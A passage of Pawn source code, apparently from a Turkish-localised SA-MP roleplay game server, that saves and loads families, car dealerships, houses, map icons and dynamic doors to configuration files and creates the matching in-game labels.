		for(new f = 0; f < MAX_FAMILY; f++)
   		{
			format(var, 32, "Family%dEntranceX=%.1f\n",f, FamilyInfo[f][FamilyEntrance][0]); fwrite(hFile, var);
			format(var, 32, "Family%dEntranceY=%.1f\n",f, FamilyInfo[f][FamilyEntrance][1]); fwrite(hFile, var);
			format(var, 32, "Family%dEntranceZ=%.1f\n",f, FamilyInfo[f][FamilyEntrance][2]); fwrite(hFile, var);
			format(var, 32, "Family%dEntranceA=%.1f\n",f, FamilyInfo[f][FamilyEntrance][3]); fwrite(hFile, var);
			format(var, 32, "Family%dExitX=%.1f\n",f, FamilyInfo[f][FamilyExit][0]); fwrite(hFile, var);
			format(var, 32, "Family%dExitY=%.1f\n",f, FamilyInfo[f][FamilyExit][1]); fwrite(hFile, var);
			format(var, 32, "Family%dExitZ=%.1f\n",f, FamilyInfo[f][FamilyExit][2]); fwrite(hFile, var);
			format(var, 32, "Family%dExitA=%.1f\n",f, FamilyInfo[f][FamilyExit][3]); fwrite(hFile, var);
			format(var, 32, "Family%dInterior=%d\n",f, FamilyInfo[f][FamilyInterior]); fwrite(hFile, var);
			format(var, 32, "Family%dCustomMap=%d\n",f, FamilyInfo[f][FamilyCustomMap]); fwrite(hFile, var);
			format(var, 32, "Family%dVirtualWorld=%d\n",f, FamilyInfo[f][FamilyVirtualWorld]); fwrite(hFile, var);

			for(new fv = 0; fv < MAX_GANG_VEHICLES; fv++)
   			{
   			    format(var, 32, "Family%dVeh%dModelId=%d\n",f, fv, FamilyVehicleInfo[f][fv][fvModelId]); fwrite(hFile, var);
				format(var, 32, "Family%dVeh%dSpawnx=%.1f\n",f, fv,FamilyVehicleInfo[f][fv][fvSpawnx]); fwrite(hFile, var);
				format(var, 32, "Family%dVeh%dSpawny=%.1f\n",f, fv,FamilyVehicleInfo[f][fv][fvSpawny]); fwrite(hFile, var);
				format(var, 32, "Family%dVeh%dSpawnz=%.1f\n",f, fv,FamilyVehicleInfo[f][fv][fvSpawnz]); fwrite(hFile, var);
				format(var, 32, "Family%dVeh%dSpawna=%.1f\n",f, fv,FamilyVehicleInfo[f][fv][fvSpawna]); fwrite(hFile, var);
				format(var, 32, "Family%dVeh%dLock=%d\n",f, fv,FamilyVehicleInfo[f][fv][fvLock]); fwrite(hFile, var);
				format(var, 32, "Family%dVeh%dLocked=%d\n",f, fv,FamilyVehicleInfo[f][fv][fvLocked]); fwrite(hFile, var);
				format(var, 32, "Family%dVeh%dPaintJob=%d\n",f, fv,FamilyVehicleInfo[f][fv][fvPaintJob]); fwrite(hFile, var);
				format(var, 32, "Family%dVeh%dColor1=%d\n",f, fv,FamilyVehicleInfo[f][fv][fvColor1]); fwrite(hFile, var);
				format(var, 32, "Family%dVeh%dColor2=%d\n",f, fv,FamilyVehicleInfo[f][fv][fvColor2]); fwrite(hFile, var);
				//if(FamilyVehicleInfo[f][fv][fvId] != INVALID_VEHICLE_ID) FamilyVehicleInfo[f][fv][fvFuel] = VehicleFuel[FamilyVehicleInfo[f][fv][fvId]];
				format(var, 32, "Family%dVeh%dFuel=%.1f\n",f, fv,FamilyVehicleInfo[f][fv][fvFuel]); fwrite(hFile, var);
    		}
  		}
		fclose(hFile);
	}
	return 1;
}

stock LoadcDealerships()
{
    new string2[64];
	format(string2, sizeof(string2), "dealerships.ini");
	new File: Dealerships = fopen(string2, io_read);

	if(Dealerships)
	{
		new key[256] , val[256];
		new Data[256];

		while (fread(Dealerships , Data , sizeof(Data)))
		{
            new string[128];

            for(new f = 0; f < MAX_CARDEALERSHIPS; f++)
            {
                key = ini_GetKey(Data);

				format(string, 128, "cd%dOwned",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdOwned] = strval(val); }
				format(string, 128, "cd%dOwner",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); strmid(CarDealershipInfo[f][cdOwner], val, 0, strlen(val)-1, 255); }
				format(string, 128, "cd%dEntranceX",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdEntranceX] = floatstr(val); }
				format(string, 128, "cd%dEntranceY",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdEntranceY] = floatstr(val); }
				format(string, 128, "cd%dEntranceZ",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdEntranceZ] = floatstr(val); }
				format(string, 128, "cd%dExitX",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdExitX] = floatstr(val); }
				format(string, 128, "cd%dExitY",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdExitY] = floatstr(val); }
				format(string, 128, "cd%dExitZ",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdExitZ] = floatstr(val); }
				format(string, 128, "cd%dMessage",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); strmid(CarDealershipInfo[f][cdMessage], val, 0, strlen(val)-1, 255); }
				format(string, 128, "cd%dTill",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdTill] = strval(val); }
				format(string, 128, "cd%dInterior",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdInterior] = strval(val); }
				format(string, 128, "cd%dVehicleSpawnX",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdVehicleSpawn][0] = floatstr(val); }
				format(string, 128, "cd%dVehicleSpawnY",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdVehicleSpawn][1] = floatstr(val); }
				format(string, 128, "cd%dVehicleSpawnZ",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdVehicleSpawn][2] = floatstr(val); }
				format(string, 128, "cd%dVehicleSpawnA",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdVehicleSpawn][3] = floatstr(val); }
				format(string, 128, "cd%dRadius",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdRadius] = floatstr(val); }
				format(string, 128, "cd%dPrice",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdPrice] = strval(val); }
    			for(new m = 0; m < MAX_DEALERSHIPVEHICLES; m++)
            	{
  					format(string, 128, "cd%dVehicleSpawnX%d", f, m);
					if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdVehicleSpawnX][m] = floatstr(val); }
					format(string, 128, "cd%dVehicleSpawnY%d", f, m);
					if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdVehicleSpawnY][m] = floatstr(val); }
					format(string, 128, "cd%dVehicleSpawnZ%d", f, m);
					if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdVehicleSpawnZ][m] = floatstr(val); }
					format(string, 128, "cd%dVehicleSpawnA%d", f, m);
					if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdVehicleSpawnAngle][m] = floatstr(val); }
					format(string, 128, "cd%dVehicleModel%d", f, m);
					if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdVehicleModel][m] = strval(val); }
					format(string, 128, "cd%dVehicleCost%d", f, m);
					if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdVehicleCost][m] = strval(val); }
            	}
 				format(string, 128, "cd%dDonator",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdDonator] = strval(val); }
            }
		}
		fclose(Dealerships);
	}
	return 1;
}

stock UpdateSANewsBroadcast()
{
    new string[42];
	if(broadcasting == 0)
	{
	    format(string, sizeof(string), "Þu An: Yayýn Yok\nIzleyici: %d", viewers);
	}
	else
	{
	    format(string, sizeof(string), "Þu An: CANLI\nIzleyici: %d", viewers);
	}
	UpdateDynamic3DTextLabelText(SANews3DText, COLOR_LIGHTBLUE, string);
}


stock SavecDealerships()
{
	new string3[32];
	//GetPlayerName(playerid, playername, MAX_PLAYER_NAME);
	format(string3, sizeof(string3), "dealerships.ini");
	new File: hFile = fopen(string3, io_write);
	if(hFile)
	{
		new var[32];
		for(new f = 0; f < MAX_CARDEALERSHIPS; f++)
   		{
   		    format(var, 32, "cd%dOwned=%d\n", f, CarDealershipInfo[f][cdOwned]); fwrite(hFile, var);
   		    format(var, 32, "cd%dOwner=%s\n", f, CarDealershipInfo[f][cdOwner]); fwrite(hFile, var);
   		    format(var, 32, "cd%dEntranceX=%.1f\n", f, CarDealershipInfo[f][cdEntranceX]); fwrite(hFile, var);
   		    format(var, 32, "cd%dEntranceY=%.1f\n", f, CarDealershipInfo[f][cdEntranceY]); fwrite(hFile, var);
   		    format(var, 32, "cd%dEntranceZ=%.1f\n", f, CarDealershipInfo[f][cdEntranceZ]); fwrite(hFile, var);
   		    format(var, 32, "cd%dExitX=%.1f\n", f, CarDealershipInfo[f][cdExitX]); fwrite(hFile, var);
   		    format(var, 32, "cd%dExitY=%.1f\n", f, CarDealershipInfo[f][cdExitY]); fwrite(hFile, var);
   		    format(var, 32, "cd%dExitZ=%.1f\n", f, CarDealershipInfo[f][cdExitZ]); fwrite(hFile, var);
   		    format(var, 32, "cd%dMessage=%s\n", f, CarDealershipInfo[f][cdMessage]); fwrite(hFile, var);
   		    format(var, 32, "cd%dTill=%d\n", f, CarDealershipInfo[f][cdTill]); fwrite(hFile, var);
   		    format(var, 32, "cd%dInterior=%d\n", f, CarDealershipInfo[f][cdInterior]); fwrite(hFile, var);
   		    format(var, 32, "cd%dVehicleSpawnX=%.1f\n", f, CarDealershipInfo[f][cdVehicleSpawn][0]); fwrite(hFile, var);
   		    format(var, 32, "cd%dVehicleSpawnY=%.1f\n", f, CarDealershipInfo[f][cdVehicleSpawn][1]); fwrite(hFile, var);
   		    format(var, 32, "cd%dVehicleSpawnZ=%.1f\n", f, CarDealershipInfo[f][cdVehicleSpawn][2]); fwrite(hFile, var);
   		    format(var, 32, "cd%dVehicleSpawnA=%.1f\n", f, CarDealershipInfo[f][cdVehicleSpawn][3]); fwrite(hFile, var);
   		    format(var, 32, "cd%dRadius=%.1f\n", f, CarDealershipInfo[f][cdRadius]); fwrite(hFile, var);
   		    format(var, 32, "cd%dPrice=%d\n", f, CarDealershipInfo[f][cdPrice]); fwrite(hFile, var);
			for(new m = 0; m < MAX_DEALERSHIPVEHICLES; m++)
   			{
   				format(var, 32, "cd%dVehicleSpawnX%d=%.1f\n", f, m, CarDealershipInfo[f][cdVehicleSpawnX][m]); fwrite(hFile, var);
   				format(var, 32, "cd%dVehicleSpawnY%d=%.1f\n", f, m, CarDealershipInfo[f][cdVehicleSpawnY][m]); fwrite(hFile, var);
   				format(var, 32, "cd%dVehicleSpawnZ%d=%.1f\n", f, m, CarDealershipInfo[f][cdVehicleSpawnZ][m]); fwrite(hFile, var);
   				format(var, 32, "cd%dVehicleSpawnA%d=%.1f\n", f, m, CarDealershipInfo[f][cdVehicleSpawnAngle][m]); fwrite(hFile, var);
   				format(var, 32, "cd%dVehicleModel%d=%d\n", f, m, CarDealershipInfo[f][cdVehicleModel][m]); fwrite(hFile, var);
   				format(var, 32, "cd%dVehicleCost%d=%d\n", f, m, CarDealershipInfo[f][cdVehicleCost][m]); fwrite(hFile, var);
			}
			format(var, 32, "cd%dDonator=%d\n", f, CarDealershipInfo[f][cdDonator]); fwrite(hFile, var);
		}
		fclose(hFile);
	}
	return 1;
}

stock LoadHouses()
{
	if(!fexist("houses.cfg")) return 1;

	new
		szFileStr[2056],
		File: iFileHandle = fopen("houses.cfg", io_read),
		iIndex;

	while(iIndex < sizeof(HouseInfo) && fread(iFileHandle, szFileStr))
	{
		sscanf(szFileStr, "p<|>iiis[8]s[24]ffffffffiiiiiiiiiiiiiiiii",
			HouseInfo[iIndex][hOwned],
			HouseInfo[iIndex][hLevel],
			HouseInfo[iIndex][hHInteriorWorld],
			HouseInfo[iIndex][hDescription],
			HouseInfo[iIndex][hOwner],
			HouseInfo[iIndex][hExteriorX],
			HouseInfo[iIndex][hExteriorY],
			HouseInfo[iIndex][hExteriorZ],
			HouseInfo[iIndex][hExteriorR],
			HouseInfo[iIndex][hInteriorX],
			HouseInfo[iIndex][hInteriorY],
			HouseInfo[iIndex][hInteriorZ],
			HouseInfo[iIndex][hInteriorR],
			HouseInfo[iIndex][hLock],
			HouseInfo[iIndex][hRentable],
			HouseInfo[iIndex][hRentFee],
			HouseInfo[iIndex][hValue],
			HouseInfo[iIndex][hSafeMoney],
			HouseInfo[iIndex][hPot],
			HouseInfo[iIndex][hCrack],
			HouseInfo[iIndex][hMaterials],
			HouseInfo[iIndex][hWeapons][0],
			HouseInfo[iIndex][hWeapons][1],
			HouseInfo[iIndex][hWeapons][2],
			HouseInfo[iIndex][hWeapons][3],
			HouseInfo[iIndex][hWeapons][4],
			HouseInfo[iIndex][hGLUpgrade],
			HouseInfo[iIndex][hPickupID],
			HouseInfo[iIndex][hCustomInterior],
			HouseInfo[iIndex][hCustomExterior]
		);
		if(HouseInfo[iIndex][hOwned])
		{
			if(HouseInfo[iIndex][hRentable] == 0) format(szFileStr, sizeof(szFileStr), "Ev sahibi: %s\nLevel: %d\nID: %d",HouseInfo[iIndex][hOwner],HouseInfo[iIndex][hLevel],iIndex);
			else format(szFileStr, sizeof(szFileStr), "Ev Sahibi: %s\nLevel: %d\nID: %d\nKira: $%d\nOda kiralamak icin /odakirala yazin",HouseInfo[iIndex][hOwner],HouseInfo[iIndex][hLevel],iIndex,HouseInfo[iIndex][hRentFee]);
		}
		else format(szFileStr, sizeof(szFileStr), "Bu ev satilik!\n Level: %d\nID: %d\nFiyat: $%d\nBu evi satin almak icin /evsatinal yazin",HouseInfo[iIndex][hLevel],iIndex,HouseInfo[iIndex][hValue]);

		HouseInfo[iIndex][hPickupID] = CreatePickup(1273, 23, HouseInfo[iIndex][hExteriorX], HouseInfo[iIndex][hExteriorY], HouseInfo[iIndex][hExteriorZ], -1);
		HouseInfo[iIndex][hTextID] = CreateDynamic3DTextLabel(szFileStr, COLOR_HOUSEGREEN, HouseInfo[iIndex][hExteriorX], HouseInfo[iIndex][hExteriorY], HouseInfo[iIndex][hExteriorZ]+0.5,20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 10.0);
		++iIndex;
	}
	return fclose(iFileHandle);
}
/*stock LoadMDs()
{
	new string[1024];
	new File: file = fopen("mds.cfg", io_read);
	new i;
	while(i < sizeof(MDI) && fread(file, string))
	{
	    sscanf(string, "p<|>iiffffffffffffii",
	    MDI[i][mdModel],
	    MDI[i][mdFaction],
	    MDI[i][mdPosX],
	    MDI[i][mdPosY],
	    MDI[i][mdPosZ],
	    MDI[i][mdRotX],
	    MDI[i][mdRotY[,
	    MDI[i][mdRotZ],
	    MDI[i][mdPosXM],
	    MDI[i][mdPosYM],
	    MDI[i][mdPosZM],
	    MDI[i][mdRotXM],
	    MDI[i][mdRotYM],
	    MDI[i][mdRotZM],
	    MDI[i][mdInt],
	    MDI[i][mdVW]);

	    MDI[i][mdID] = CreateDynamicObject(MDI[i][mdModel], MDI[i][mdPosX], MDI[i][mdPosY], MDI[i][mdPosZ], MDI[i][mdRotX], MDI[i][mdRotY], MDI[i][mdRotZ], MDI[i][mdVW], MDI[i][mdInt], -1);
	    ++i;
	}
}
stock SaveMDs()
{
	new string[1024];
	new File: file = fopen("mds.cfg", io_write);

	for(new i = 0; i < MAX_MDS; i++)
	{
	    format(string, sizeof(string), "%d|%d|%f|%f|%f|%f|%f|%f|%f|%f|%f|%f|%f|%f|%d|%d",
	    MDI[i][mdModel],
	    MDI[i][mdFaction],
	    MDI[i][mdPosX],
	    MDI[i][mdPosY],
	    MDI[i][mdPosZ],
	    MDI[i][mdRotX],
	    MDI[i][mdRotY[,
	    MDI[i][mdRotZ],
	    MDI[i][mdPosXM],
	    MDI[i][mdPosYM],
	    MDI[i][mdPosZM],
	    MDI[i][mdRotXM],
	    MDI[i][mdRotYM],
	    MDI[i][mdRotZM],
	    MDI[i][mdInt],
	    MDI[i][mdVW]);
	    fwrite(file, string);
	}
	return fclose(file);
}*/

stock SaveHouses()
{
	new
		szFileStr[1024],
		File: fHandle = fopen("houses.cfg", io_write);

	for(new iIndex; iIndex < MAX_HOUSES; iIndex++) {
		format(szFileStr, sizeof(szFileStr), "%d|%d|%d||%s|%s|%f|%f|%f|%f|%f|%f|%f|%f|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d\r\n",
			HouseInfo[iIndex][hOwned],
			HouseInfo[iIndex][hLevel],
			HouseInfo[iIndex][hHInteriorWorld],
			HouseInfo[iIndex][hDescription],
			HouseInfo[iIndex][hOwner],
			HouseInfo[iIndex][hExteriorX],
			HouseInfo[iIndex][hExteriorY],
			HouseInfo[iIndex][hExteriorZ],
			HouseInfo[iIndex][hExteriorR],
			HouseInfo[iIndex][hInteriorX],
			HouseInfo[iIndex][hInteriorY],
			HouseInfo[iIndex][hInteriorZ],
			HouseInfo[iIndex][hInteriorR],
			HouseInfo[iIndex][hLock],
			HouseInfo[iIndex][hRentable],
			HouseInfo[iIndex][hRentFee],
			HouseInfo[iIndex][hValue],
   			HouseInfo[iIndex][hSafeMoney],
			HouseInfo[iIndex][hPot],
			HouseInfo[iIndex][hCrack],
			HouseInfo[iIndex][hMaterials],
			HouseInfo[iIndex][hWeapons][0],
			HouseInfo[iIndex][hWeapons][1],
			HouseInfo[iIndex][hWeapons][2],
			HouseInfo[iIndex][hWeapons][3],
			HouseInfo[iIndex][hWeapons][4],
			HouseInfo[iIndex][hGLUpgrade],
			HouseInfo[iIndex][hPickupID],
			HouseInfo[iIndex][hCustomInterior],
			HouseInfo[iIndex][hCustomExterior]
		);
		fwrite(fHandle, szFileStr);
	}
	return fclose(fHandle);
}

stock IntToPercentage(value, percentage) {
	return (value/100)*percentage;
}

stock LoadDynamicMapIcons()
{
	new arrCoords[7][64];
	new strFromFile2[256];
	new File: file = fopen("dynamicmapicons.cfg", io_read);
	if(file)
	{
		new idx;
		while (idx < sizeof(DMPInfo))
		{
			fread(file, strFromFile2);
			splits(strFromFile2, arrCoords, '|');
	  		DMPInfo[idx][dmpMarkerType] = strval(arrCoords[0]);
	  		DMPInfo[idx][dmpColor] = strval(arrCoords[1]);
	  		DMPInfo[idx][dmpVW] = strval(arrCoords[2]);
	  		DMPInfo[idx][dmpInt] = strval(arrCoords[3]);
	  		DMPInfo[idx][dmpPosX] = floatstr(arrCoords[4]);
	  		DMPInfo[idx][dmpPosY] = floatstr(arrCoords[5]);
	  		DMPInfo[idx][dmpPosZ] = floatstr(arrCoords[6]);

	  		if(DMPInfo[idx][dmpMarkerType] != 0)
	  		{
    			DMPInfo[idx][dmpMapIconID] = CreateDynamicMapIcon(DMPInfo[idx][dmpPosX], DMPInfo[idx][dmpPosY], DMPInfo[idx][dmpPosZ], DMPInfo[idx][dmpMarkerType], DMPInfo[idx][dmpColor], DMPInfo[idx][dmpVW], DMPInfo[idx][dmpInt], -1, 500.0);
			}

			idx++;
		}
		fclose(file);
	}
	return 1;
}

stock SaveDynamicMapIcons()
{
	new
		szFileStr[326],
		File: fHandle = fopen("dynamicmapicons.cfg", io_write);

	for(new iIndex; iIndex < MAX_DMAPICONS; iIndex++) {
		format(szFileStr, sizeof(szFileStr), "%d|%d|%d|%d|%f|%f|%f\r\n",
			DMPInfo[iIndex][dmpMarkerType],
			DMPInfo[iIndex][dmpColor],
			DMPInfo[iIndex][dmpVW],
			DMPInfo[iIndex][dmpInt],
			DMPInfo[iIndex][dmpPosX],
			DMPInfo[iIndex][dmpPosY],
			DMPInfo[iIndex][dmpPosZ]
		);
		fwrite(fHandle, szFileStr);
	}
	return fclose(fHandle);
}

stock LoadDynamicDoors()
{
	new arrCoords[26][64];
	new strFromFile2[256];
	new File: file = fopen("dynamicdoors.cfg", io_read);
	if(file)
	{
		new idx;
		while (idx < sizeof(DDoorsInfo))
		{
			fread(file, strFromFile2);
			splits(strFromFile2, arrCoords, '|');
			strmid(DDoorsInfo[idx][ddDescription], arrCoords[0], 0, strlen(arrCoords[0]), 128);
	  		DDoorsInfo[idx][ddCustomInterior] = strval(arrCoords[1]);
	  		DDoorsInfo[idx][ddExteriorVW] = strval(arrCoords[2]);
	  		DDoorsInfo[idx][ddExteriorInt] = strval(arrCoords[3]);
	  		DDoorsInfo[idx][ddInteriorVW] = strval(arrCoords[4]);
	  		DDoorsInfo[idx][ddInteriorInt] = strval(arrCoords[5]);
	  		DDoorsInfo[idx][ddExteriorX] = floatstr(arrCoords[6]);
	  		DDoorsInfo[idx][ddExteriorY] = floatstr(arrCoords[7]);
	  		DDoorsInfo[idx][ddExteriorZ] = floatstr(arrCoords[8]);
	  		DDoorsInfo[idx][ddExteriorA] = floatstr(arrCoords[9]);
	  		DDoorsInfo[idx][ddInteriorX] = floatstr(arrCoords[10]);
	  		DDoorsInfo[idx][ddInteriorY] = floatstr(arrCoords[11]);
	  		DDoorsInfo[idx][ddInteriorZ] = floatstr(arrCoords[12]);
	  		DDoorsInfo[idx][ddInteriorA] = floatstr(arrCoords[13]);
	  		DDoorsInfo[idx][ddCustomExterior] = strval(arrCoords[14]);
	  		DDoorsInfo[idx][ddVIP] = strval(arrCoords[15]);
	  		DDoorsInfo[idx][ddGang] = strval(arrCoords[16]);
	  		DDoorsInfo[idx][ddFaction] = strval(arrCoords[17]);
	  		DDoorsInfo[idx][ddAdmin] = strval(arrCoords[18]);
	  		DDoorsInfo[idx][ddWanted] = strval(arrCoords[19]);
	  		DDoorsInfo[idx][ddVehicleAble] = strval(arrCoords[20]);
	  		DDoorsInfo[idx][ddColor] = strval(arrCoords[21]);
	  		DDoorsInfo[idx][ddPickupModel] = strval(arrCoords[22]);
	  		strmid(DDoorsInfo[idx][ddPass], arrCoords[23], 0, strlen(arrCoords[23]), 24);
	  		DDoorsInfo[idx][ddLocked] = strval(arrCoords[24]);
            DDoorsInfo[idx][ddNotEditable] = strval(arrCoords[25]);

	  		if(!isnull(DDoorsInfo[idx][ddDescription]))
	  		{
	  		    CreateDynamicDoor(idx);
			}

			idx++;
		}
		fclose(file);
	}
	return 1;
}

stock SaveDynamicDoors()
{

	new
		szFileStr[512],
		File: fHandle = fopen("dynamicdoors.cfg", io_write);

	for(new iIndex; iIndex < MAX_DDOORS; iIndex++) {
		format(szFileStr, sizeof(szFileStr), "%s|%d|%d|%d|%d|%d|%f|%f|%f|%f|%f|%f|%f|%f|%d|%d|%d|%d|%d|%d|%d|%d|%d|%s|%d|%d\r\n",
			DDoorsInfo[iIndex][ddDescription],
			DDoorsInfo[iIndex][ddCustomInterior],
			DDoorsInfo[iIndex][ddExteriorVW],
			DDoorsInfo[iIndex][ddExteriorInt],
			DDoorsInfo[iIndex][ddInteriorVW],
			DDoorsInfo[iIndex][ddInteriorInt],
			DDoorsInfo[iIndex][ddExteriorX],
			DDoorsInfo[iIndex][ddExteriorY],
			DDoorsInfo[iIndex][ddExteriorZ],
			DDoorsInfo[iIndex][ddExteriorA],
			DDoorsInfo[iIndex][ddInteriorX],
			DDoorsInfo[iIndex][ddInteriorY],
			DDoorsInfo[iIndex][ddInteriorZ],
			DDoorsInfo[iIndex][ddInteriorA],
			DDoorsInfo[iIndex][ddCustomExterior],
			DDoorsInfo[iIndex][ddVIP],
	  		DDoorsInfo[iIndex][ddGang],
	  		DDoorsInfo[iIndex][ddFaction],
	  		DDoorsInfo[iIndex][ddAdmin],
	  		DDoorsInfo[iIndex][ddWanted],
	  		DDoorsInfo[iIndex][ddVehicleAble],
	  		DDoorsInfo[iIndex][ddColor],
	  		DDoorsInfo[iIndex][ddPickupModel],
	  		DDoorsInfo[iIndex][ddPass],
	  		DDoorsInfo[iIndex][ddLocked],
	  		DDoorsInfo[iIndex][ddNotEditable]
		);
		fwrite(fHandle, szFileStr);
	}
	return fclose(fHandle);
}

stock CreateDynamicDoor(doorid)
{
	new string[128];
	//format(string, sizeof(string), "%s\nID: %d",DDoorsInfo[doorid][ddDescription],doorid);
	format(string, sizeof(string), "%s",DDoorsInfo[doorid][ddDescription]);

	switch(DDoorsInfo[doorid][ddColor])
	{
	    case -1:{ /* Disable 3d Textdraw */ }
	    case 1:{DDoorsInfo[doorid][ddTextID] = CreateDynamic3DTextLabel(string, COLOR_TWWHITE, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ]+0.7,10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, DDoorsInfo[doorid][ddExteriorVW], DDoorsInfo[doorid][ddExteriorInt], -1);}
	    case 2:{DDoorsInfo[doorid][ddTextID] = CreateDynamic3DTextLabel(string, COLOR_TWPINK, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ]+0.7,10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, DDoorsInfo[doorid][ddExteriorVW], DDoorsInfo[doorid][ddExteriorInt], -1);}
	    case 3:{DDoorsInfo[doorid][ddTextID] = CreateDynamic3DTextLabel(string, COLOR_TWRED, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ]+0.7,10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, DDoorsInfo[doorid][ddExteriorVW], DDoorsInfo[doorid][ddExteriorInt], -1);}
	    case 4:{DDoorsInfo[doorid][ddTextID] = CreateDynamic3DTextLabel(string, COLOR_TWBROWN, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ]+0.7,10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, DDoorsInfo[doorid][ddExteriorVW], DDoorsInfo[doorid][ddExteriorInt], -1);}
	    case 5:{DDoorsInfo[doorid][ddTextID] = CreateDynamic3DTextLabel(string, COLOR_TWGRAY, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ]+0.7,10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, DDoorsInfo[doorid][ddExteriorVW], DDoorsInfo[doorid][ddExteriorInt], -1);}
	    case 6:{DDoorsInfo[doorid][ddTextID] = CreateDynamic3DTextLabel(string, COLOR_TWOLIVE, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ]+0.7,10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, DDoorsInfo[doorid][ddExteriorVW], DDoorsInfo[doorid][ddExteriorInt], -1);}
	    case 7:{DDoorsInfo[doorid][ddTextID] = CreateDynamic3DTextLabel(string, COLOR_TWPURPLE, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ]+0.7,10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, DDoorsInfo[doorid][ddExteriorVW], DDoorsInfo[doorid][ddExteriorInt], -1);}
	    case 8:{DDoorsInfo[doorid][ddTextID] = CreateDynamic3DTextLabel(string, COLOR_TWORANGE, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ]+0.7,10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, DDoorsInfo[doorid][ddExteriorVW], DDoorsInfo[doorid][ddExteriorInt], -1);}
	    case 9:{DDoorsInfo[doorid][ddTextID] = CreateDynamic3DTextLabel(string, COLOR_TWAZURE, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ]+0.7,10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, DDoorsInfo[doorid][ddExteriorVW], DDoorsInfo[doorid][ddExteriorInt], -1);}
	    case 10:{DDoorsInfo[doorid][ddTextID] = CreateDynamic3DTextLabel(string, COLOR_TWGREEN, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ]+0.7,10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, DDoorsInfo[doorid][ddExteriorVW], DDoorsInfo[doorid][ddExteriorInt], -1);}
	    case 11:{DDoorsInfo[doorid][ddTextID] = CreateDynamic3DTextLabel(string, COLOR_TWBLUE, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ]+0.7,10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, DDoorsInfo[doorid][ddExteriorVW], DDoorsInfo[doorid][ddExteriorInt], -1);}
	    case 12:{DDoorsInfo[doorid][ddTextID] = CreateDynamic3DTextLabel(string, COLOR_TWBLACK, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ]+0.7,10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, DDoorsInfo[doorid][ddExteriorVW], DDoorsInfo[doorid][ddExteriorInt], -1);}
		default:
		{
